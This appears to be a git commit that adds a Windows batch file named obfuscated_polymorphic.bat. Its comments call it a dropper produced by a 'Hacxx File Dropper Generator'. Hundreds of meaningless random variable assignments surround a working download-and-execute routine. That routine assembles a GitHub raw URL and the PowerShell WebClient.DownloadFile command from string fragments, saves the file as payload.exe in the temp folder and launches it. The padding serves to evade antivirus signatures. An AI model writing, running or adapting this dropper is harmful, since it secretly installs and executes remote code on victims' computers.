9a1bc5e36d1fc9835c29a72043a36230ba0aff95
Howleds <kambizmokhtari200@gmail.com>
2025-11-04 12:51:51 -0800

    Add files via upload

---
+++ obfuscated_polymorphic.bat
@@ -0,0 +1,373 @@
+@echo off
+REM Build:U46VFPlvWiGB0VLR
+@set initFPWhjK=YPWhjKLj >nul 2>&1
+@set initGnEaq0=GnEaq0G75 >nul 2>&1
+@set initGnEaq0=PDFP6o9pUFjA >nul 2>&1
+@set initPDFP6o=PDFP6o9pU >nul 2>&1
+@set initPDFP6o=ZUFvLMCIJeJEWQ >nul 2>&1
+@set initZUFvLM=ZUFvLMCIJ >nul 2>&1
+@set initZUFvLM=jaFar960zM8IT >nul 2>&1
+@set initWaFar9=LaFar960zM8ITlg >nul 2>&1
+@set initWaFar9=NJn2yp0OwHhzwn >nul 2>&1
+@set initNJn2yp=WZoIdNu7lgHDt >nul 2>&1
+@set initWZoIdN=WZoIdNu7 >nul 2>&1
+@set WZoId=%random%
+@set bfonT=%random%
+@set /a bfonT=%WZoId%+%bfonT% >nul 2>&1
+@set /a _calcIv02W=%random%+%random%-(%random%/100) >nul 2>&1
+@set _dat_XwR4faac=XwR4faac6NfHAnaE >nul 2>&1
+@set /a _calcRM1HC=%random%+%random%-(%random%/100) >nul 2>&1
+@set /a _tNMRJ=%random% >nul 2>&1
+REM CRC:67081
+@set /a _crcRM1HC=%random%+%random% >nul 2>&1
+@set /a _tNMRJ=%random% >nul 2>&1
+@set /a _tmp_OMRJVyDv=%_tNMRJ%+%_tNMRJ% >nul 2>&1
+@set /a _calcRM1HC=%random%+%random%-(%random%/100) >nul 2>&1
+@set _val_OMRJVyDv=%random%_%random% >nul 2>&1
+@set _xRM1HCe=Z21nhCdGKsBH >nul 2>&1
+@set _xc21nhC=%_xRM1HCe% >nul 2>&1
+@set _env_MlzC2Oyi=%random%_%random% >nul 2>&1
+@set /a _calcx21nh=%random%+%random%-(%random%/100) >nul 2>&1
+@set _ref_MlzC2Oyi=%random%_%random% >nul 2>&1
+:: ID:GBJfpS7uHnKyM1ZYwJGuy6Sl
+@set _idx21nh=GBJfpS7uHn >nul 2>&1
+@set _tmp_MlzC2Oyi=%random%_%random% >nul 2>&1
+@set /a _calcGBJfp=%random%+%random%-(%random%/100) >nul 2>&1
+@set /a _tsThu=%random% >nul 2>&1
+@set /a _calcPRJU4=%random%+%random%-(%random%/100) >nul 2>&1
+@set /a _tsThu=%random% >nul 2>&1
+REM CRC:50143
+@set /a _crcPRJU4=%random%+%random% >nul 2>&1
+@set /a _ref_sThua4t6=%_tsThu%+%_tsThu% >nul 2>&1
+@set /a _calcY7KAJ=%random%+%random%-(%random%/100) >nul 2>&1
+@set _ref_sThua4t6=sThua4t6Pc >nul 2>&1
+@set /a _calcY7KAJ=%random%+%random%-(%random%/100) >nul 2>&1
+@set _env_Bah9PrWo=%random%_%random% >nul 2>&1
+@set /a _calcY7KAJ=%random%+%random%-(%random%/100) >nul 2>&1
+@set _key_Bah9PrWo=Bah9PrWoELnw >nul 2>&1
+@set /a _calcY7KAJ=%random%+%random%-(%random%/100) >nul 2>&1
+@set _chk_KqhPuPpH=%random%_%random% >nul 2>&1
+@set /a _calcDGrsR=%random%+%random%-(%random%/100) >nul 2>&1
+@set _var_KqhPuPpH=%random%_%random% >nul 2>&1
+@set /a _calcDGrsR=%random%+%random%-(%random%/100) >nul 2>&1
+@set _dat_TGiuadSZ=%random%_%random% >nul 2>&1
+@set /a _calcDGrsR=%random%+%random%-(%random%/100) >nul 2>&1
+@set _env_TGiuadSZ=%random%_%random% >nul 2>&1
+@set /a _calcDGrsR=%random%+%random%-(%random%/100) >nul 2>&1
+@set _env_TGiuadSZ=TGiuadSZjRdEE >nul 2>&1
+@set /a _calcNWs8w=%random%+%random%-(%random%/100) >nul 2>&1
+@set _key_zf0nhtNN=%random%_%random% >nul 2>&1
+@set _xNWs8wh=NWs8whsb7X8A >nul 2>&1
+@set _xNWs8wh=%_xNWs8wh% >nul 2>&1
+@set _obf_zf0nhtNN=%random%_%random% >nul 2>&1
+@set /a _calcNWs8w=%random%+%random%-(%random%/100) >nul 2>&1
+@set /a _tIv02=%random% >nul 2>&1
+@set /a _calcsva0D=%random%+%random%-(%random%/100) >nul 2>&1
+@set /a _tIv02=%random% >nul 2>&1
+REM CRC:71729
+@set /a _crcsva0D=%random%+%random% >nul 2>&1
+@set /a _key_zf0nhtNN=%_tIv02%+%_tIv02% >nul 2>&1
+:: ID:sva0DxnZ4TirTAtXzeBepjEa
+@set _idsva0D=BLaFjVQhTr >nul 2>&1
+@set _robYd=%random%
+@set _rLJG6=%_robYd:~-3,2% 2>nul
+@set /a mb5W6Zxu3kcaqfIL8nSv22=%random%+%random%-(%random%/100) >nul 2>&1
+@set _rLJG6=%random%
+@set _rLJG6=%_rLJG6:~-3,2% 2>nul
+@set /a var_b5W6Zxu3kcaqfIL8n=%random% >nul 2>&1
+@set /a mb5W6Zxu3kcaqfIL8nSv22=%random%+%random%-(%random%/100) >nul 2>&1
+@set /a var_b5W6Zxu3kcaqfIL8n=%random% >nul 2>&1
+@set /a mb5W6Zxu3kcaqfIL8nSv22=%random%+%random%-(%random%/100) >nul 2>&1
+@set _xLJG=0
+@if %random% lss 0 set _xLJG=1
+@if %random% gtr 99999 set _xV0G=2
+@set /a var_Ir2ovyswgQFf4nMGbRlF=%var_b5W6Zxu3kcaqfIL8n%+%var_b5W6Zxu3kcaqfIL8n% >nul 2>&1
+@set _nV0GLeI=V0GLeI8I
+@set _nV0GLeI=%_nV0GLeI%V0GLeI8I
+REM Gen:125107_Mx7bZ0G7ON1C
+@set _xAyo=0
+@if %random% lss 0 set _xAyo=1
+@if %random% gtr 99999 set _xAyo=2
+@set _wygqHRRK1IEbmQcxysUeF32=604742335 >nul 2>&1
+@set _xAyo=0
+@if %random% lss 0 set _xAyo=1
+@if %random% gtr 99999 set _xAyo=2
+@set xFOh6mfk3Qh4fjl1TN=FbojSBmqodCz >nul 2>&1
+@set _rAyoD=%random%
+@set _rdwH6=%_rAyoD:~-3,2% 2>nul
+@set /a Ir2ovysw_Ir2ovysw=%random%+%random%-(%random%/100) >nul 2>&1
+@set _ddwH6=%random%
+@set _ddwH6=%random%
+@if %_ddwH6% gtr 99999 set _ddwH6=1
+@set /a var_wdRXtpgOmVnblc6yd04a=%random% >nul 2>&1
+@set _ndwH6zu=mNHLeRxB
+@set _nmNHLeR=%_ndwH6zu%mNHLeRxB
+@set /a _wdRXtpgOmVnblc6yd04aPMb=%random% >nul 2>&1
+@set /a _cYlpDl=%random% >nul 2>&1
+@set /a _cYlpDl=%random% >nul 2>&1
+@set /a _cYlpDl=%_cYlpDl%+%_cYlpDl% >nul 2>&1
+@set /a Ir2ovysw_Ir2ovysw=%random%+%random%-(%random%/100) >nul 2>&1
+@set _rHU7w=%random%
+@set _rHU7w=%_rHU7w:~-3,2% 2>nul
+@set /a _wdRXtpgOmVnblc6y=%var_wdRXtpgOmVnblc6yd04a%+%_wdRXtpgOmVnblc6yd04aPMb% >nul 2>&1
+@set /a _cHU7wt=%random% >nul 2>&1
+@set /a _cHU7wt=%random% >nul 2>&1
+@set /a _cHU7wt=%_cHU7wt%+%_cHU7wt% >nul 2>&1
+@set /a _m9QAEPb8pqruIsdSlQ=%random%+%random%-(%random%/100) >nul 2>&1
+@set _rQa7b=%random%
+@set _rQa7b=%_rQa7b:~-3,2% 2>nul
+@set FOh6mfk3Qh4f_iMAyAKlQysKw=%random%_%random% >nul 2>&1
+@set /a _cQa7b8=%random% >nul 2>&1
+@set /a _cQa7b8=%random% >nul 2>&1
+@set /a _cQa7b8=%_cQa7b8%+%_cQa7b8% >nul 2>&1
+:: ID:VN8REo9qEmqGlFrmRgoHRvGc
+@set _xZr8=0
+@if %random% lss 0 set _xZr8=1
+@if %random% gtr 99999 set _xZr8=2
+@set _iMAyAKlQysKwzk8CBlP1LiQ=VN8REo9qEm >nul 2>&1
+@set _xZr8=0
+@if %random% lss 0 set _xZr8=1
+@if %random% gtr 99999 set _xZr8=2
+@set iMAyAKlQys_r3Adf8P9n0=%random%_%random% >nul 2>&1
+@set /a _cZr8RN=%random% >nul 2>&1
+@set /a _cbhxWn=%random% >nul 2>&1
+@set /a _cbhxWn=%_cZr8RN%+%_cbhxWn% >nul 2>&1
+@set r3Adf8P9_r3Adf8P9=%random%_%random% >nul 2>&1
+@set /a _cbhxWn=%random% >nul 2>&1
+@set /a _cbhxWn=%random% >nul 2>&1
+@set /a _cbhxWn=%_cbhxWn%+%_cbhxWn% >nul 2>&1
+:: ID:BmQJME4dBhAxYGYkw8oG6ulz
+@set _r3Adf8P9n09AwQXXQAN=BmQJME4dBh >nul 2>&1
+@set cAjBSVwirczzEtlMj5QLd0=%random%_%random% >nul 2>&1
+@set /a _j9QAEPb8pqruIsdS=%random%+%random%-(%random%/100) >nul 2>&1
+@set cAjBSVwirczzEtlMj5QLd0=%random%_%random% >nul 2>&1
+@set var_AjBSVwirczzEtlMj5QLd=%random%
+REM CRC:72561
+@set /a var_J9QAEPb8pqruIsdSl=%random%+%random% >nul 2>&1
+@set var_AjBSVwirczzEtlMj5QLd=%_rOiOz:~-3,2% 2>nul
+@set gSjL2Mdf_gSjL2Mdf=Fl9TItZRXYw >nul 2>&1
+@set _gSjL2Mdf9uIv6nihKILc=OQws3wVQ
+@set /a _P22N3Vjtsz1Rxueswd54ArM=%random%+%random%-(%random%/100) >nul 2>&1
+@set _gSjL2Mdf9uIv6nihKILc=%_gSjL2Mdf9uIv6nihKILc%OQws3wVQ
+REM Gen:125107_k0WTl41g3e0e
+@set /a P22N3Vjtsz1_P22N3Vjtsz1=%random%+%random%-(%random%/100) >nul 2>&1
+@set /a _oGRUZA8J4xhDCtRzPlmBfO=%random% >nul 2>&1
+@set _p8jqH9GxZ38z3S7CZYKNn=Ar38F70tqJPN >nul 2>&1
+@set _p8jqH9GxZ38z3S7CZYKNn=%_p8jqH9GxZ38z3S7CZYKNn% >nul 2>&1
+@set /a _oGRUZA8J4xhDCtRzPlmBfO=%random% >nul 2>&1
+@set qBZIwhi2Q3l1cnqkd4sLaK=H7FnrKAL0yLi >nul 2>&1
+@set qBZIwhi2Q3l1cnqkd4sLaK=%qBZIwhi2Q3l1cnqkd4sLaK% >nul 2>&1
+@set /a _oGRUZA8J4xhDCtRzPlmBfO=%_oGRUZA8J4xhDCtRzPlmBfO%+%_oGRUZA8J4xhDCtRzPlmBfO% >nul 2>&1
+REM Gen:125107_QoF26834P6bm
+@set _BZIwhi2Q3l1cnqkd=286902680 >nul 2>&1
+@set var_KfJbWFv8STrgkV9=755558888 >nul 2>&1
+@set _KfJbWFv8STrgkV9zjIK=A5PzWpqV
+REM Gen:125107_QoF26834P6bm
+@set var_KfJbWFv8STrgkV9=1391610958 >nul 2>&1
+@set _KfJbWFv8STrgkV9zjIK=%_KfJbWFv8STrgkV9zjIK%A5PzWpqV
+@set var_nd2E9bxWA57xAUhi8=tGE5OK657IAg >nul 2>&1
+@set var_nd2E9bxWA57xAUhi8=%var_nd2E9bxWA57xAUhi8% >nul 2>&1
+@set nd2E9bxWA_nd2E9bxWA=%random%_%random% >nul 2>&1
+@set /a _oGRUZA8J4xhDCtRzPlmBfO=%random%+%random%-(%random%/100) >nul 2>&1
+@set var_fMKwhrsJx0goeWN=A5PzWpqV
+@set var_fMKwhrsJx0goeWN=%var_fMKwhrsJx0goeWN%MVeFvxMe
+REM CRC:95019
+@set /a Awg0yIu18Pa_Awg0yIu18Pa=%random%+%random% >nul 2>&1
+@set /a nAwg0yIu18PafW14aUQnYD=%random%+%random%-(%random%/100) >nul 2>&1
+@set _BMKwhrsJx0goeWNgNe=EdoATMraBAKh >nul 2>&1
+@set _BMKwhrsJx0goeWNgNe=%_BMKwhrsJx0goeWNgNe% >nul 2>&1
+@set dMKwhrsJx0go_FK3YuWtxfbWG=%random%
+REM CRC:20661
+@set /a _OpUQM8Ch0A0kTSuxHfuau=%random%+%random% >nul 2>&1
+@set wliKRBcolb75w8XqXhJD8l=%_rMVeF:~-3,2% 2>nul
+@set /a kCpUQM8Ch0A0kTSux=%random%+%random%-(%random%/100) >nul 2>&1
+@set var_liKRBcolb75w8XqX=OBaynRs9MwWR4vM >nul 2>&1
+@set /a kCpUQM8Ch0A0kTSux=%random%+%random%-(%random%/100) >nul 2>&1
+@set wliKRBcolb75w8XqXhJD8l=%random%
+@set wliKRBcolb75w8XqXhJD8l=%_rruWy:~-3,2% 2>nul
+@set /a RpUQM8Ch0A_mOtCBJ7Dx9=%random%+%random%-(%random%/100) >nul 2>&1
+@set /a mOtCBJ7Dx9_mOtCBJ7Dx9=%random% >nul 2>&1
+@set _LRsJJsj882fmLYXVWBD7Ar=%random%
+@set _oRsJJsj882fmLYXVWBD7A=%random%
+@if %_LRsJJsj882fmLYXVWBD7Ar% gtr 99999 set _oRsJJsj882fmLYXVWBD7A=1
+REM CRC:62845
+@set _GqaCQIeW5Xodp0tTBtD6=%random%
+@set _GqaCQIeW5Xodp0tTBtD6=%_rJsf0:~-3,2% 2>nul
+@set /a var_ZJTAE70VnKVTqu8XN=%random%+%random% >nul 2>&1
+@set _GqaCQIeW5Xodp0tTBtD6Q=0
+@if %random% lss 0 set _GqaCQIeW5Xodp0tTBtD6Q=1
+@if %random% gtr 99999 set pGqaCQIeW5Xodp0tT=2
+@set /a mOtCBJ7Dx9_mOtCBJ7Dx9=%random% >nul 2>&1
+@set pGqaCQIeW5Xodp0tT=0
+@if %random% lss 0 set pGqaCQIeW5Xodp0tT=1
+@if %random% gtr 99999 set pGqaCQIeW5Xodp0tT=2
+REM CRC:21523
+@set _PGahw6HeVwOhlvifQJBGXa1=%random%
+@set _PGahw6HeVwOhlvifQJBGXa1=%_rdJgF:~-3,2% 2>nul
+@set /a var_ZJTAE70VnKVTqu8XN=%random%+%random% >nul 2>&1
+@set var_PGahw6HeVwOhlvifQ=0
+@if %random% lss 0 set var_PGahw6HeVwOhlvifQ=1
+@if %random% gtr 99999 set var_PGahw6HeVwOhlvifQ=2
+@set /a ZJTAE70VnKVT_ZJTAE70VnKVT=%mOtCBJ7Dx9_mOtCBJ7Dx9%+%mOtCBJ7Dx9_mOtCBJ7Dx9% >nul 2>&1
+REM Gen:125107_DwXeGPXRIlPm
+@set var_sEuJJBI2CHuzCupYFmyT=%random%
+@set var_sEuJJBI2CHuzCupYFmyT=%random%
+@if %var_sEuJJBI2CHuzCupYFmyT% gtr 99999 set var_sEuJJBI2CHuzCupYFmyT=1
+@set lsEuJJBI2CHuzCupYFmyTWF=1825595931 >nul 2>&1
+@set ksEuJJBI2CHuzCupYFmy=%random%_%random% >nul 2>&1
+@set var_DvTPiJ5kHZnbW=%random%
+@set var_DvTPiJ5kHZnbW=%random%
+@if %var_DvTPiJ5kHZnbW% gtr 99999 set var_DvTPiJ5kHZnbW=1
+@set DvTPiJ5k_DvTPiJ5k=%random%_%random% >nul 2>&1
+@set /a var_Yoos5BcK3QoFGOsFlUCn=%random% >nul 2>&1
+@set /a var_Yoos5BcK3QoFGOsFlUCn=%random% >nul 2>&1
+@set /a var_Yoos5BcK3QoFG=%var_Yoos5BcK3QoFGOsFlUCn%+%var_Yoos5BcK3QoFGOsFlUCn% >nul 2>&1
+@set /a Yoos5BcK3Qo_eFvu583wM7h=%random%+%random%-(%random%/100) >nul 2>&1
+@set gtchwf68o_gtchwf68o=%random%
+@set gtchwf68o_gtchwf68o=%random%
+@if %gtchwf68o_gtchwf68o% gtr 99999 set gtchwf68o_gtchwf68o=1
+@set _gtchwf68ob2tc1Khz=%random%_%random% >nul 2>&1
+@set /a var_Yoos5BcK3QoFG=%random% >nul 2>&1
+@set /a _eFvu583wM7hsWtnprD8oGM=%random% >nul 2>&1
+@set /a _eFvu583wM7hsWtnprD8oGM=%var_Yoos5BcK3QoFG%+%_eFvu583wM7hsWtnprD8oGM% >nul 2>&1
+@set xW2UaDv1Vl6cjQ3ggemws=MHSLPSjynyUQCxWVh >nul 2>&1
+:: ID:MNXTmdq9xTfqSOMlnhBGCAin
+@set _W2UaDv1Vl6cjQ3ggem=MNXTmdq9xT >nul 2>&1
+@set liUPiTuebEB_liUPiTuebEB=MHSLPSjynyUQCxWVh2E >nul 2>&1
+REM CRC:24261
+@set /a xeFvu583wM7hsWtnprD8o=%random%+%random% >nul 2>&1
+@set /a var_d0PEMbgXKU6xgDA=%random% >nul 2>&1
+@set /a var_d0PEMbgXKU6xgDA=%random% >nul 2>&1
+@set /a twSMnBObDI_twSMnBObDI=%var_d0PEMbgXKU6xgDA%+%var_d0PEMbgXKU6xgDA% >nul 2>&1
+@set /a dvR1GRobW7jzm6NkOsG=%random%+%random%-(%random%/100) >nul 2>&1
+@set var_xiUPiTuebEBoMy5=%random%_%random% >nul 2>&1
+@set /a _vR1GRobW7jzm6NkOs=%random%+%random%-(%random%/100) >nul 2>&1
+@set _xiUPiTuebEBoMy5Bt=0
+REM CRC:11999
+@set /a vR1GRobW7jz_hGL2VHaF7uf=%random%+%random% >nul 2>&1
+@if %random% lss 0 set _xiUPiTuebEBoMy5Bt=1
+@set /a var_hGL2VHaF7ufYf0QNjL=%random%+%random%-(%random%/100) >nul 2>&1
+@if %random% gtr 99999 set uKQCHq9p27ALeqABz8uv1W7=2
+@set /a var_hGL2VHaF7ufYf0QNjL=%random%+%random%-(%random%/100) >nul 2>&1
+REM Multi-File Dropper Batch Script
+@set KQCHq9p27_nPVaDEqPP=Tn17bKeb
+@set nPVaDEqPP_nPVaDEqPP=%KQCHq9p27_nPVaDEqPP%Tn17bKeb
+@set /a ohGL2VHaF7ufYf0QNjLnt=%random%+%random%-(%random%/100) >nul 2>&1
+REM Generated by Hacxx File Dropper Generator
+REM Gen:125107_bFH6OnHrCBsB
+@set zFkfdMN8U3_zFkfdMN8U3=429196805 >nul 2>&1
+@set var_zFkfdMN8U3k807WT=Z3DmWnOu
+@set /a var_Ht9g0z1ZqtvprK4E=%random%+%random%-(%random%/100) >nul 2>&1
+@set var_zFkfdMN8U3k807WT=%var_zFkfdMN8U3k807WT%Z3DmWnOu
+:: ID:Bs6kTfxLVzI2s7CTw7LSaYT6
+@set var_cEDHqiOVBf0qg=r4O5uLYyEO >nul 2>&1
+
+REM Gen:125107_d4O5uLYyEOv4
+@set var_cEDHqiOVBf0qg6=430454641 >nul 2>&1
+@set var_cEDHqiOVBf0qg64=0
+@set /a wHt9g0z1ZqtvprK4EB=%random%+%random%-(%random%/100) >nul 2>&1
+@if %random% lss 0 set var_cEDHqiOVBf0qg64=1
+REM CRC:33458
+@set /a ybkZmreZUMqEAkjM5crJ72=%random%+%random% >nul 2>&1
+@if %random% gtr 99999 set var_cEDHqiOVBf0qg64=2
+:: ID:IDwXC1TlBJEURYEAEFuXluwm
+@set var_RclAxyJJya9hU7AAw7q=lBPpPxU9iV >nul 2>&1
+REM Change to temporary directory
+@set /a zkZmreZUMq_zkZmreZUMq=%random%+%random%-(%random%/100) >nul 2>&1
+@set /a ihgD38UD9pu7SoYccNFzszCK=%random% >nul 2>&1
+@set /a ihgD38UD9pu7SoYccNFzszCK=%random% >nul 2>&1
+REM Gen:125107_uRP5vVnr7tJg
+@set RclAxyJJya9_RclAxyJJya9=756013545 >nul 2>&1
+@set /a _hgD38UD9pu7SoYccNFz=%ihgD38UD9pu7SoYccNFzszCK%+%ihgD38UD9pu7SoYccNFzszCK% >nul 2>&1
+cd %TEMP%
+@set jLslfdVc1nIzlRDpWLnooE5=MIKZi9yS
+@set jLslfdVc1nIzlRDpWLnooE5=%jLslfdVc1nIzlRDpWLnooE5%MIKZi9yS
+
+@set _zslfdVc1nIzlRDpWLnoo=DZLEXx1b
+@set _zslfdVc1nIzlRDpWLnoo=%_zslfdVc1nIzlRDpWLnoo%DZLEXx1b
+REM Download files
+@set dvT2omF5RO1rNf4VoPEW7=0
+@if %random% lss 0 set dvT2omF5RO1rNf4VoPEW7=1
+@if %random% gtr 99999 set dvT2omF5RO1rNf4VoPEW7=2
+echo Downloading %TEMP%\\payload.exe... 2>nul 2>nul
+@set tvT2omF5RO1rNf4VoPEW7zYV=Pxtx5MWZ
+@set tvT2omF5RO1rNf4VoPEW7zYV=%tvT2omF5RO1rNf4VoPEW7zYV%Pxtx5MWZ
+@set vV0WfFIbEfJWXGzVB=https
+@set var_V0WfFIbEfJWXGzVBuqV=G9JMOQsh
+@set eY693wCRWAOpTSZXs3cMmB6=%var_V0WfFIbEfJWXGzVBuqV%G9JMOQsh
+@set nY693wCRWAOpTSZXs3cM=://raw
+@set _Y693wCRWAOpTSZXs3cM=%random%
+@set _Y693wCRWAOpTSZXs3cM=%_rG9JM:~-3,2% 2>nul
+@set ijdzOL7GyuEHA92ZonWMk64=%vV0WfFIbEfJWXGzVB%%nY693wCRWAOpTSZXs3cM%
+@set jdzOL7GyuEH_jdzOL7GyuEH=gxDN8BA4
+@set jdzOL7GyuEH_jdzOL7GyuEH=%jdzOL7GyuEH_jdzOL7GyuEH%gxDN8BA4
+@set cFbihQbjYtuDqY3BXI4=.gith
+@set nbihQbjYtuD_nbihQbjYtuD=0
+@if %random% lss 0 set nbihQbjYtuD_nbihQbjYtuD=1
+@if %random% gtr 99999 set nbihQbjYtuD_nbihQbjYtuD=2
+@set var_xjRcGu8GuLwy7WVXQefS=ubuser
+@set xjRcGu8GuL_xjRcGu8GuL=sTRhFSJF
+@set xjRcGu8GuL_xjRcGu8GuL=%xjRcGu8GuL_xjRcGu8GuL%sTRhFSJF
+@set uhii2d9xW5GGzG593wkJvA=%cFbihQbjYtuDqY3BXI4%%var_xjRcGu8GuLwy7WVXQefS%
+@set var_hii2d9xW5GGzG593=%random%
+@set uTL2andM0sv_uTL2andM0sv=%_rsTRh:~-3,2% 2>nul
+@set cFbihQbjYtuDqY3BXI4=conte
+@set uTL2andM0sv_uTL2andM0sv=%random%
+@set uTL2andM0sv_uTL2andM0sv=%_rLRaJ:~-3,2% 2>nul
+@set cuTL2andM0sv9PAt1g4nM1=nt.com
+@set var_EURBdRZCGuSaA4oJbAYh=0
+@if %random% lss 0 set var_EURBdRZCGuSaA4oJbAYh=1
+@if %random% gtr 99999 set cuTL2andM0sv9PAt1g4nM1=2
+@set _EURBdRZCGuSaA4oJbAYhcOg=%cFbihQbjYtuDqY3BXI4%%cuTL2andM0sv9PAt1g4nM1%
+@set var_EURBdRZCGuSaA4o=%random%
+@set var_EURBdRZCGuSaA4o=%random%
+@if %var_EURBdRZCGuSaA4o% gtr 99999 set var_EURBdRZCGuSaA4o=1
+@set _fn0fFaplHIExd7jJFHGF41O=/Howl
+@set var_fn0fFaplHIExd7=eds/et
+@set _po5OIEbbmK1yZAerzd=%_fn0fFaplHIExd7jJFHGF41O%%var_fn0fFaplHIExd7%
+@set npo5OIEbbmK1yZAerzdhafp=hical
+@set kpo5OIEbbmK1yZAerzdh=-bulls
+@set _mN7dmyGrIWH0bG2i=%npo5OIEbbmK1yZAerzdhafp%%kpo5OIEbbmK1yZAerzdh%
+@set ON7dmyGrI_MlP6tOBfF=hit-t
+@set cuTL2andM0sv9PAt1g4nM1=hing/r
+@set MlP6tOBf_MlP6tOBf=%ON7dmyGrI_MlP6tOBfF%%cuTL2andM0sv9PAt1g4nM1%
+@set var_MlP6tOBfFRQRPIz=efs/h
+@set L0jXVjN4lWj_L0jXVjN4lWj=eads/m
+@set var_L0jXVjN4lWjD51SY=%var_MlP6tOBfFRQRPIz%%L0jXVjN4lWj_L0jXVjN4lWj%
+@set BaxDgsZlrkp_BaxDgsZlrkp=ain/i
+@set BaxDgsZl_BaxDgsZl=njecto
+@set fTV0R3jGZ0_fTV0R3jGZ0=%BaxDgsZlrkp_BaxDgsZlrkp%%BaxDgsZl_BaxDgsZl%
+@set var_fTV0R3jGZ020tc7FsXf=r.exe
+@set hkOskfBArJl1yfHrpb=%ijdzOL7GyuEHA92ZonWMk64%%uhii2d9xW5GGzG593wkJvA%%_EURBdRZCGuSaA4oJbAYhcOg%%_po5OIEbbmK1yZAerzd%%_mN7dmyGrIWH0bG2i%%MlP6tOBf_MlP6tOBf%%var_L0jXVjN4lWjD51SY%%fTV0R3jGZ0_fTV0R3jGZ0%%var_fTV0R3jGZ020tc7FsXf%
+@set var_kOskfBArJl1yfHrpbIxB=%TEMP%
+@set var_kHDyEHHMLtAV4JsZ=
+@set var_MlP6tOBfFRQRPIz=paylo
+@set wHDyEHHMLt_wHDyEHHMLt=ad.exe
+@set _D5yzXsPzeVNEXGbs=%var_MlP6tOBfFRQRPIz%%wHDyEHHMLt_wHDyEHHMLt%
+@set D5yzXsPzeV_D5yzXsPzeV=%var_kOskfBArJl1yfHrpbIxB%\\%var_kHDyEHHMLtAV4JsZ%\\%_D5yzXsPzeVNEXGbs%
+@set D5yzXsPze_N6D91WBpT=pow
+@set _N6D91WBpTX9FI96af=ersh
+@set var_N6D91WBpTX9FI96a=ell
+@set var_J2hRICfDw2CWNNwh=%D5yzXsPze_N6D91WBpT%%_N6D91WBpTX9FI96af%%var_N6D91WBpTX9FI96a%
+@set _J2hRICfDw2CWNNwh=New-Ob
+@set _J2hRICfDw2CWNNwh=ject
+@set _Ria94RlssRzhq9efd=Net.Web
+@set var_FgtBhnmga2fzG8mY2DVU=Client
+@set FgtBhnmga2f_FgtBhnmga2f=Down
+@set _WiGyEZwzJO4jLLn4OB3Prim=load
+@set WiGyEZwzJO_WiGyEZwzJO=File
+@set _YxzQZeBoFD0Eo762cpu0PdJ=(%_J2hRICfDw2CWNNwh%%_J2hRICfDw2CWNNwh% %_Ria94RlssRzhq9efd%%var_FgtBhnmga2fzG8mY2DVU%).%FgtBhnmga2f_FgtBhnmga2f%%_WiGyEZwzJO4jLLn4OB3Prim%%WiGyEZwzJO_WiGyEZwzJO%
+%var_J2hRICfDw2CWNNwh% -Command "(%_J2hRICfDw2CWNNwh%%_J2hRICfDw2CWNNwh% %_Ria94RlssRzhq9efd%%var_FgtBhnmga2fzG8mY2DVU%).%FgtBhnmga2f_FgtBhnmga2f%%_WiGyEZwzJO4jLLn4OB3Prim%%WiGyEZwzJO_WiGyEZwzJO%('%hkOskfBArJl1yfHrpb%', '%D5yzXsPzeV_D5yzXsPzeV%')"
+
+REM Execute files
+echo Executing %TEMP%\\payload.exe... 2>nul
+start "" "%TEMP%\\payload.exe"
+
+@set YxzQZeBoF_YxzQZeBoF=All o
+@set var_Px72R2o89hDoi=perat
+@set Px72R2o89h_Px72R2o89h=ions 
+@set _NHs5xkYS9pdfVNxvVZE=compl
+@set _NHs5xkYS9pdfVNxvVZE=eted.
+@set _NHs5xkYS9pdfVNxvVZED=%YxzQZeBoF_YxzQZeBoF%%var_Px72R2o89hDoi%%Px72R2o89h_Px72R2o89h%%_NHs5xkYS9pdfVNxvVZE%%_NHs5xkYS9pdfVNxvVZE%
+@echo %_NHs5xkYS9pdfVNxvVZED%
+pause >nul 2>&1
